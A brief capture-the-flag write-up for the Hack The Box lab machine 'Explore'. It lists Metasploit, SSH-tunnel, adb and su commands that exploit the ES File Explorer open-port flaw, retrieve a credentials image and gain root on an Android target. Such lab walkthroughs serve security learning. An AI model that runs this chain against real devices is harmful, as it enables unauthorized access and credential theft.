# explore.htb

#### gather user credentials
use action `LISTFILES` to view the existing files, here I saw `creds.jpg`

```bash
$ msfconsole -x "use auxiliary/scanner/http/es_file_explorer_open_port;\
set RHOSTS 10.10.10.247;\
set ACTION GETFILE;\
set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg;\
run"
```

#### create ssh tunnel
copy down the login credentails and pass them in to our ssh tunnel

```bash
$ ./exploit -h 10.10.10.247:2222 -u kristi -p <password>
```

#### connect to user over adb

```bash
$ adb connect localhost:5555
$ adb shell
```

#### Gain root access
```
$ su root
```